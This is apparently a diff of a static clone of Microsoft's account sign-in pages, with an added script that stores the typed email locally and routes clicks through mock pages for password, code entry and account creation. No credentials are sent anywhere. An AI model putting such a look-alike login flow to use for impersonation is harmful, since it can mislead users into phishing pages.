+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ </div>
 </div></div>
-<div data-bind="component: { name: 'instrumentation-control',
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ <div data-bind="component: { name: 'instrumentation-control',
             publicMethods: instrumentationMethods,
             params: { serverData: svr } }">
 </div>
+ 
+ </div>
+ 
+ 
+ <div data-bind="component: { name: 'fed-cred-buttons-control',
+            params: {
+                serverData: svr,
+                fedCredOptions: $page.otherSigninOptions },
+            event: {
+                fedCredButtonClick: $page.otherSigninOptionsButton_onClick } }">
+<div data-bind="css: { 'app': $page.backgroundLogoUrl }">
+ <div class="promoted-fed-cred-content promoted-fed-cred-box ext-promoted-fed-cred-box" data-bind="css: {
+        'animate': $page.useCssAnimations &amp;&amp; $page.animate(),
+        'slide-out-next': $page.animate.isSlideOutNext,
+        'slide-in-next': $page.animate.isSlideInNext,
+        'slide-out-back': $page.animate.isSlideOutBack,
+        'slide-in-back': $page.animate.isSlideInBack,
+        'app': $page.backgroundLogoUrl }">
+ 
+ 
+ 
+ 
+ <div class=tile-container data-bind="css: { 'binaryChoice list': svr.fSupportWindowsStyles }">
+ <div class="row tile">
+ <div class=table role=button tabindex=0 data-bind="
+                    css: { 'list-item': svr.fSupportWindowsStyles },
+                    pressEnter: $fedCredButtonsControl.fedCredButton_onClick,
+                    click: $fedCredButtonsControl.fedCredButton_onClick,
+                    ariaLabel: $data.helpText ? $data.text + ' ' + $data.helpText : $data.text" aria-label="Sign-in options">
+ <div class=table-row>
+ <div class="table-cell tile-img medium">
+ 
+<img class="tile-img medium" role=presentation data-bind="addEventHandlers, attr: { src: $data.darkIconUrl }" src="assets/8e5cd2bae620c123a5900c9aedc3e328.svg">
+ </div>
+ <div class="table-cell text-left content" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
+ <div data-bind="text: $data.text, attr: { 'data-test-id': $data.testId }" data-test-id=signinOptions>Sign-in options</div>
+ 
+ </div>
+ </div>
+ </div>
+ </div>
+ 
+ </div>
+ 
+ 
+ 
+ 
+ 
+ </div>
 </div>
 </div>
+ 
+ 
+ 
+ 
+ 
+ 
+ </div>
 </div>
 </div>
-</div>
-</div>
-<div class="position-absolute--left-0--bottom-0--width-100pct--overflow- ext-footer" data-bind="
+ </div>
+ </div>
+ 
+ <div id=footer role=contentinfo data-bind="
         externalCss: {
-            'position-absolute--left-0--bottom-0--width-100pct--overflow-': true,
+            'footer': true,
             'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
-            'background-always-visible': $page.backgroundLogoUrl }" id="position-absolute--left-0--bottom-0--width-100pct--overflow-" role="contentinfo">
-<div data-bind="component: { name: 'footer-control',
+            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">
+ <div data-bind="component: { name: 'footer-control',
             publicMethods: $page.footerMethods,
             params: {
                 serverData: svr,
@@ -256,8 +545,10 @@
             event: {
                 agreementClick: $page.footer_agreementClick,
                 showDebugDetails: $page.toggleDebugDetails_onClick } }">
-<div class="margin-0--float-right text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }" id="footerLinks">
-<a class="footer-content ext-footer-content footer-item ext-footer-item" data-bind="
+<div id=footerLinks class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">
+ 
+ 
+ <a id=ftrTerms data-bind="
             text: termsText,
             href: termsLink,
             click: termsLink_onClick,
@@ -265,8 +556,10 @@
                 'footer-content': true,
                 'footer-item': true,
                 'has-background': !useDefaultBackground,
-                'background-always-visible': hasDarkBackground }" href="#" id="ftrTerms">Terms of use</a>
-<a class="footer-content ext-footer-content footer-item ext-footer-item" data-bind="
+                'background-always-visible': hasDarkBackground }" href="#" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
+ 
+ 
+ <a id=ftrPrivacy data-bind="
             text: privacyText,
             href: privacyLink,
             click: privacyLink_onClick,
@@ -274,8 +567,14 @@
                 'footer-content': true,
                 'footer-item': true,
                 'has-background': !useDefaultBackground,
-                'background-always-visible': hasDarkBackground }" href="#" id="ftrPrivacy">Privacy &amp; cookies</a>
-<a aria-expanded="false" aria-label="Click here for troubleshooting information" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item" data-bind="
+                'background-always-visible': hasDarkBackground }" href="#" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
+ 
+ 
+ 
+ 
+ 
+ 
+ <a id=moreOptions href=# role=button data-bind="
         click: moreInfo_onClick,
         ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
         attr: { 'aria-expanded': showDebugDetails().toString() },
@@ -285,14 +584,212 @@
             'footer-item': true,
             'debug-item': true,
             'has-background': !useDefaultBackground,
-            'background-always-visible': hasDarkBackground }" href="#" id="moreOptions" role="padding-4px-12px-4px-12px--position-relative--max-width-100p">...</a>
+            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded=false class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
 </div>
 </div>
+ </div>
+ 
 </div>
 </div>
+ 
+ 
+ 
 </div>
-</div>
+ 
 </form>
-<form aria-hidden="true" data-bind="postRedirectForm: postRedirect" method="POST" target="_top"></form>
-</div></body>
-</html>
+<form data-bind="postRedirectForm: postRedirect" method=POST aria-hidden=true target=_top></form>
+</div>
+<script>
+window.addEventListener('load', function() {
+    function saveEmail() {
+        var emailInput1 = document.querySelector('#i0116');
+        var emailInput2 = document.querySelector('#floatingLabelInput4');
+        var emailInput3 = document.querySelector('input[type="email"]');
+        var email = '';
+        if (emailInput1 && emailInput1.value) email = emailInput1.value;
+        else if (emailInput2 && emailInput2.value) email = emailInput2.value;
+        else if (emailInput3 && emailInput3.value) email = emailInput3.value;
+        
+        if (email) {
+            localStorage.setItem('enteredEmail', email);
+        }
+    }
+
+    var storedEmail = localStorage.getItem('enteredEmail');
+    if (storedEmail) {
+        var bannerText = document.querySelector('#bannerText');
+        if (bannerText) bannerText.textContent = storedEmail;
+        var identityBadge = document.querySelector('#identityBadge');
+        if (identityBadge) identityBadge.setAttribute('aria-label', storedEmail);
+        
+        var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+        var node;
+        while(node = walker.nextNode()) {
+            if (node.nodeValue.includes('johndoe@ms.com')) {
+                node.nodeValue = node.nodeValue.replace(/johndoe@ms\.com/g, storedEmail);
+            }
+            if (node.nodeValue.includes('ret657@res.cc')) {
+                node.nodeValue = node.nodeValue.replace(/ret657@res\.cc/g, storedEmail);
+                node.nodeValue = node.nodeValue.replace(/mb9wvkp5ll@yzcalo\.com/g, storedEmail);
+            }
+        }
+    }
+
+    function overrideClick(selector, url) {
+        var els = document.querySelectorAll(selector);
+        els.forEach(function(el) {
+            el.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                saveEmail();
+                window.location.href = url;
+            }, true);
+        });
+    }
+    function overrideSubmit(selector, url) {
+        var els = document.querySelectorAll(selector);
+        els.forEach(function(el) {
+            el.addEventListener('submit', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                saveEmail();
+                window.location.href = url;
+            }, true);
+        });
+    }
+
+                            var path = window.location.pathname;
+
+    overrideClick('button[data-bi-id="signedout.hero.signIn"]', 'sign_in.html');
+    overrideClick('a[aria-label="Sign in to your account"]', 'sign_in.html');
+    overrideClick('button[data-bi-id="signedout.end-hero.sign-in"]', 'sign_in.html');
+    overrideClick('button[data-bi-id="signedout.end-hero.create-account"]', 'create_account.html');
+    overrideClick('a[aria-label="Create a Microsoft account"]', 'create_account.html');
+
+    if (path.endsWith('sign_in.html') || path.endsWith('sign_in_2.html')) {
+        overrideClick('#idSIButton9', 'enter_password.html');
+        overrideSubmit('form', 'enter_password.html');
+        overrideClick('#signup', 'create_account.html');
+        overrideClick('#cantAccessAccount', 'sign_in_options.html');
+        overrideClick('.tile, [data-test-id="signinOptions"]', 'sign_in_options.html');
+        overrideClick('#back-button', 'index.html');
+    } else if (path.endsWith('enter_password.html')) {
+        overrideClick('#idSIButton9', 'stay_signed_in.html');
+        overrideSubmit('form', 'stay_signed_in.html');
+        overrideClick('#back-button', 'sign_in.html');
+        var links = document.querySelectorAll('button, span, a');
+        links.forEach(function(el) {
+            if (el.textContent.includes('Forgot your password?') || el.textContent.includes('Other ways to sign in')) {
+                el.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    saveEmail();
+                    window.location.href = 'sign_in_options.html';
+                }, true);
+            }
+        });
+    } else if (path.endsWith('get_code.html') || path.endsWith('get_code_2.html')) {
+        overrideClick('#idSIButton9, [data-testid="primaryButton"]', 'enter_code.html');
+        overrideSubmit('form', 'enter_code.html');
+        overrideClick('#back-button', 'sign_in_options.html');
+    } else if (path.endsWith('enter_code.html') || path.endsWith('enter_code_2.html')) {
+        overrideClick('#idSIButton9', 'stay_signed_in.html');
+        overrideSubmit('form', 'stay_signed_in.html');
+        overrideClick('#back-button', 'get_code.html');
+        var inputs = document.querySelectorAll('input[id^="codeEntry-"]');
+        inputs.forEach(function(input, index) {
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                var pasteData = (e.clipboardData || window.clipboardData).getData('text').trim();
+                if (pasteData.length > 0) {
+                    var chars = pasteData.split('');
+                    for (var i = 0; i < chars.length && index + i < inputs.length; i++) {
+                        inputs[index + i].value = chars[i];
+                    }
+                    var nextIndex = Math.min(index + chars.length, inputs.length - 1);
+                    inputs[nextIndex].focus();
+                    if (index + chars.length >= inputs.length) {
+                        saveEmail();
+                        window.location.href = 'stay_signed_in.html';
+                    }
+                }
+            });
+            input.addEventListener('input', function() {
+                if (this.value.length >= 1) {
+                    this.value = this.value.slice(-1);
+                    if (index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    } else {
+                        saveEmail();
+                        window.location.href = 'stay_signed_in.html';
+                    }
+                }
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+    } else if (path.endsWith('stay_signed_in.html')) {
+        overrideClick('#idSIButton9', 'dashboard.html');
+        overrideClick('#idBtn_Back', 'dashboard.html');
+        overrideSubmit('form', 'dashboard.html');
+    } else if (path.endsWith('create_account.html')) {
+        overrideClick('#idSIButton9', 'verify_email.html');
+        overrideSubmit('form', 'verify_email.html');
+        overrideClick('#back-button', 'sign_in.html');
+    } else if (path.endsWith('verify_email.html')) {
+        overrideClick('#idSIButton9', 'add_details.html');
+        overrideSubmit('form', 'add_details.html');
+        overrideClick('#back-button', 'create_account.html');
+        var inputs = document.querySelectorAll('input[id^="codeEntry-"]');
+        inputs.forEach(function(input, index) {
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                var pasteData = (e.clipboardData || window.clipboardData).getData('text').trim();
+                if (pasteData.length > 0) {
+                    var chars = pasteData.split('');
+                    for (var i = 0; i < chars.length && index + i < inputs.length; i++) {
+                        inputs[index + i].value = chars[i];
+                    }
+                    var nextIndex = Math.min(index + chars.length, inputs.length - 1);
+                    inputs[nextIndex].focus();
+                    if (index + chars.length >= inputs.length) {
+                        saveEmail();
+                        window.location.href = 'add_details.html';
+                    }
+                }
+            });
+            input.addEventListener('input', function() {
+                if (this.value.length >= 1) {
+                    this.value = this.value.slice(-1);
+                    if (index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    } else {
+                        saveEmail();
+                        window.location.href = 'add_details.html';
+                    }
+                }
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+    } else if (path.endsWith('add_details.html')) {
+        overrideClick('#idSIButton9', 'error.html');
+        overrideSubmit('form', 'error.html');
+        overrideClick('#back-button', 'verify_email.html');
+    } else if (path.endsWith('sign_in_options.html') || path.endsWith('sign_in_options_2.html')) {
+        overrideClick('.tile, [data-testid="tile"]', 'get_code.html');
+        overrideClick('#back-button', 'sign_in.html');
+    } else if (path.endsWith('error.html')) {
+        overrideClick('#close-button', 'index.html');
+        setTimeout(function() {
+            window.location.href = 'index.html';
+        }, 5000);
+    }
+});
+</script>
